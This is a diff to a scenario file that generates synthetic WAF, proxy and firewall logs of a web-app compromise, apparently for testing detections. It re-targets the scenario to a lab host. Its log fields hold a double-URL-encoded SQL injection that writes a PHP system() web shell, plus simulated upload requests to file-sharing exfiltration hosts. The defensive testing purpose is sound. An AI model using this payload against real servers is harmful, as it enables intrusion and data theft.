@@ -25,7 +25,7 @@ scenarios
 Public-facing web app exploitation followed by post-exploitation persistence and data theft. Models the most common externally-discoverable compromise pattern: WAF logs reveal the probe phase, the successful exploit, the web shell drop, and finally the egress when the attacker pulls data out.
 
 **See also `recon_to_account_probe`** — a different attacker profile against the same illustrative
-target (`app.corp.example` / `10.10.30.10`): lighter, targeted WAF probing that does NOT succeed
+target (PHDMZ-WEB01 on Phantom Lab): lighter, targeted WAF probing that does NOT succeed
 and instead pivots into account-probing at the VPN portal. Run both to demonstrate that detection
 covers both outcomes — probing that gets stopped and probing that doesn't — but they intentionally
 use different source IPs and are not meant to be chained as one incident.
@@ -77,15 +77,19 @@ empty. `compact=true` is lossless for this purpose and keeps the payload inside 
    If `proxy` is `MISSING`, use the installed `firewall` entry for Stages 3-4 and say so (outbound visibility is reduced: no URL category, no user context). If neither `proxy` nor `firewall` is installed, skip the outbound legs of Stages 3 and 4 with this sentence: "No installed data source covers the `<class>` class, so I am skipping Stage <N> (<stage name>). I will not generate it with a generic schema. Install a `<class>` data source from the Marketplace to include it."
 4. In your final report, list every stage you skipped or substituted and which of the alerts above will therefore not fire.
 
+## Pre-flight: read the organization
+
+The target is the organization's public web host. Call `organization_get(section="hosts", filter="role=dmz")` and take the web server (PHDMZ-WEB01 on Phantom Lab, `172.16.10.10`), and `organization_get(section="egress")` for its public address (`egress.dmz_public.PHDMZ-WEB01`, `151.254.90.10` on Phantom Lab). Do not invent a web host, an application server or a public domain. The organization defines no public host name for the web application: where a WAF field needs a host or URL, use the public address or the server name, and tell the operator they can add a public name with `organization_update`.
+
 ## Narrative thread
 
 - **Attacker source IP:** `203.0.113.42` (single fixed source; no need for distributed pattern)
-- **Target web app:** `https://app.corp.example` (front-end at `10.10.30.10`)
+- **Target web app:** the public web application on PHDMZ-WEB01 (the WAF sees it at its DMZ address, `172.16.10.10`; the Internet reaches it at `151.254.90.10`)
 - **Vulnerable endpoint:** `/search.php?id=` (classic union-based SQLi)
 - **WAF policy bypass payload:** uses double-URL-encoded UNION SELECT against the user table
 - **Web shell drop path:** `/uploads/img.php` (innocuous-looking)
 - **Web shell name:** `img.php` (1.4 KB; PHP backdoor using `system()` for command exec)
-- **Compromised web server:** `web-app-01` at `10.10.30.10`
+- **Compromised web server:** PHDMZ-WEB01 at `172.16.10.10` (the web host from the organization)
 - **Exfil destination:** `paste.dropfiles.io` (file-sharing service, attacker-controlled)
 - **Wall-clock time:** Stage 1 ~15 min noise. Stage 2 ~3 min focused exploit. Stage 3 ~5 min from drop to first call. Stage 4 ~10 min of bulk extraction.
 
@@ -107,7 +111,7 @@ xlog.create_data_worker:
   destination: logdest:<id from log_destinations_list>
   observables_dict:
     src:        ["203.0.113.42"]
-    dst:        ["10.10.30.10"]
+    dst:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
     spt:      ["49152", "51234", "57890", "60123"]
     dpt:      ["443"]
     proto:      ["6"]
@@ -165,7 +169,7 @@ xlog.create_data_worker:
   destination: logdest:<id from log_destinations_list>
   observables_dict:
     src:        ["203.0.113.42"]
-    dst:        ["10.10.30.10"]
+    dst:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
     spt:      ["49152", "51234", "57890", "60123"]
     dpt:      ["443"]
     proto:      ["6"]
@@ -212,7 +216,7 @@ xlog.create_data_worker:
   destination: logdest:<id from log_destinations_list>
   observables_dict:
     src:        ["203.0.113.42"]
-    dst:        ["10.10.30.10"]
+    dst:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
     request:           ["/uploads/img.php?test=1",
                     "/search.php?id=1%2527%2520UNION%2520SELECT%2520%2522%253C%253Fphp%2520system%2528%2524_POST%255B%2522pw%2522%255D%2529%253B%253F%253E%2522%2520INTO%2520OUTFILE%2520%2522%252Fvar%252Fwww%252Fhtml%252Fuploads%252Fimg.php%2522--%2520"]
     requestMethod:        ["GET"]
@@ -239,7 +243,7 @@ xlog.create_data_worker:
   destination: logdest:<id from log_destinations_list>
   observables_dict:
     src:        ["203.0.113.42"]
-    dst:        ["10.10.30.10"]
+    dst:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
     request:           ["/uploads/img.php"]
     requestMethod:        ["POST"]
     httpStatusCode:   ["200"]
@@ -285,8 +289,8 @@ xlog.create_data_worker:
   interval: 38
   destination: logdest:<id from log_destinations_list>
   observables_dict:
-    src:        ["10.10.30.10"]
-    shost:      ["web-app-01"]
+    src:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
+    shost:      ["<web server: PHDMZ-WEB01>"]
     request:           ["https://paste.dropfiles.io/upload",
                     "https://api.dropfiles.io/v2/objects",
                     "https://transfer.sh/?action=upload"]
@@ -314,7 +318,7 @@ xlog.create_data_worker:
   max_events: 10
   destination: logdest:<id from log_destinations_list>
   observables_dict:
-    src:        ["10.10.30.10"]
+    src:        ["<web server DMZ address: 172.16.10.10 for PHDMZ-WEB01>"]
     dst:        ["104.21.x.x", "172.67.x.x"]
     dpt:      ["443"]
     proto:      ["6"]
@@ -326,7 +330,7 @@ xlog.create_data_worker:
 ```
 
 **Field semantics:**
-- `src_ip: 10.10.30.10` — the WEB SERVER initiates the outbound, not a workstation. Web servers should rarely make outbound HTTPS calls (occasionally to package mirrors, never to file-sharing services)
+- `src_ip` (the web server's DMZ address, `172.16.10.10` for PHDMZ-WEB01; its public egress address is `151.254.90.10`) — the WEB SERVER initiates the outbound, not a workstation. Web servers should rarely make outbound HTTPS calls (occasionally to package mirrors, never to file-sharing services)
 - `bytes_sent` — multi-MB payloads (5-20 MB chunks) — way outside the normal "API call" range web tier logs see
 - `category: file-sharing` — proxy classification of the destination
 - The unusual EGRESS direction (server → external) on a server that should only see INGRESS is the strongest single signal
@@ -342,8 +346,8 @@ xlog.create_data_worker:
 | SQLi probe alerts (high count) from `203.0.113.42` | XSIAM Issues |
 | Successful SQLi alert with `action=allow` + large response | XSIAM Issues |
 | Webshell deployment alert against `/uploads/img.php` | XSIAM Issues |
-| Exfiltration alert: web-app-01 → file-sharing destination | XSIAM Issues |
-| Pivotable: filter `dst_ip=10.10.30.10`, see all phases on one timeline | XQL: `config timeframe = 24h \| dataset = <dataset_name of the waf entry> \| filter <its destination-IP field> = "10.10.30.10" \| limit 20` |
+| Exfiltration alert: PHDMZ-WEB01 → file-sharing destination | XSIAM Issues |
+| Pivotable: filter `dst_ip=<web server DMZ address>`, see all phases on one timeline | XQL: `config timeframe = 24h \| dataset = <dataset_name of the waf entry> \| filter <its destination-IP field> = "<web server DMZ address>" \| limit 20` |
 
 ## Tear-down
 
